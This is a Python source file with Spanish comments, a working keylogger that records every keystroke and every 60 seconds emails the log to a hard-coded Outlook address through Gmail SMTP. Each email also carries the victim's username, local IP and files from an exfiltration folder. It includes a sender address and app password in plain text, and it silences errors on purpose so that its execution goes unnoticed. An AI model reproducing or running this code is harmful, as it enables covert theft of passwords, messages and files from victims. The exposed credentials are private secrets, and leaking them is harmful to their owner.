import threading
import smtplib
import mimetypes
import socket  # <--- Necesario para obtener la IP
import getpass # <--- Necesario para obtener el usuario
from datetime import datetime
from email.message import EmailMessage
from pathlib import Path
from pynput import keyboard

# ──────────────────────────────────────────────────────────
#  CONFIGURA TUS CREDENCIALES
# ──────────────────────────────────────────────────────────
REMITENTE     = "pabloescada3@gmail.com"
DESTINATARIO  = "mago.personal@outlook.com"
CLAVE_APP_GMA = "aasu olet lmpx iayp"        # ← sin espacios

# Carpeta donde colocarás los ficheros a exfiltrar
CARPETA_ADJUNTOS        = Path(__file__).with_name("adjuntos")
LIMITE_TOTAL_ADJUNTOS   = 8 * 1024 * 1024      # 8 MB

# ──────────────────────────────────────────────────────────
current_log = []
lock        = threading.Lock()

# ──────────────── FUNCIONES AUXILIARES ───────────────────
def obtener_info_dispositivo() -> tuple[str, str]:
    """Obtiene el nombre de usuario y la dirección IP local."""
    try:
        usuario = getpass.getuser()
    except Exception:
        usuario = "Desconocido"

    try:
        # Obtiene el nombre del host y luego resuelve su IP
        # Esto generalmente dará la IP local principal
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
    except socket.gaierror:
        ip_address = "Desconocida (Error DNS)"
    except Exception:
        ip_address = "Desconocida (Error General)"

    return usuario, ip_address

def adjuntar_archivos(msg: EmailMessage) -> None:
    """Añade como adjuntos los ficheros de la carpeta indicada
       respetando el límite de tamaño configurado."""
    if not CARPETA_ADJUNTOS.exists():
        return

    total = 0
    for fichero in CARPETA_ADJUNTOS.iterdir():
        if not fichero.is_file():
            continue
        peso = fichero.stat().st_size
        if total + peso > LIMITE_TOTAL_ADJUNTOS:
            continue

        tipo, _ = mimetypes.guess_type(fichero)
        maintype, subtype = (tipo or "application/octet-stream").split("/", 1)
        with fichero.open("rb") as fp:
            msg.add_attachment(
                fp.read(),
                maintype=maintype,
                subtype=subtype,
                filename=fichero.name,
            )
        total += peso

def enviar_email(cuerpo: str) -> None:
    """Envía el log y los adjuntos por correo, incluyendo IP y usuario."""
    try:
        # --- Obtener información del dispositivo ---
        usuario_pc, ip_pc = obtener_info_dispositivo()
        ahora = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        # --- Fin obtener información ---

        mensaje = EmailMessage()
        mensaje["From"]    = REMITENTE
        mensaje["To"]      = DESTINATARIO
        # --- Modificar asunto para incluir info ---
        mensaje["Subject"] = f"Log de {usuario_pc}@{ip_pc} - {ahora}"

        # --- Crear el cuerpo del mensaje con la nueva info ---
        cuerpo_completo = f"Información del Dispositivo:\n"
        cuerpo_completo += f"Usuario: {usuario_pc}\n"
        cuerpo_completo += f"IP Local: {ip_pc}\n"
        cuerpo_completo += f"Fecha y Hora (Envío): {ahora}\n"
        cuerpo_completo += "----------------------------------\n\n"
        cuerpo_completo += "Log de Teclado:\n"
        cuerpo_completo += cuerpo # Añadir el log de teclas capturado
        # --- Fin creación cuerpo ---

        mensaje.set_content(cuerpo_completo)

        adjuntar_archivos(mensaje)

        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            smtp.login(REMITENTE, CLAVE_APP_GMA)
            smtp.send_message(mensaje)
    except Exception as e:
        # Silenciar cualquier error para no delatar la ejecución
        # print(f"Error enviando email: {e}") # Descomentar SOLO para depuración
        pass

# ───────────── ENVÍO TEMPORIZADO ─────────────
def save_log():
    global current_log
    with lock:
        if current_log:
            log_para_enviar = "\n".join(current_log)
            enviar_email(log_para_enviar) # Pasamos el log actual
            current_log = [] # Limpiamos el log después de enviarlo
    # Re-programar el timer para la próxima ejecución
    threading.Timer(60, save_log).start()

# ───────────── CAPTURA DE TECLAS ─────────────
def on_press(key):
    timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
    with lock:
        try:
            # Registrar caracter normal
            current_log.append(f"{timestamp} Tecla: '{key.char}'")
        except AttributeError:
            # Registrar tecla especial (Shift, Ctrl, Alt, etc.)
            tecla = str(key).replace('Key.', '').upper()
            current_log.append(f"{timestamp} Tecla especial: [{tecla}]")

# ───────────── EJECUCIÓN ─────────────
# Inicia el temporizador de envío la primera vez
save_log()

# Inicia el listener del teclado
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()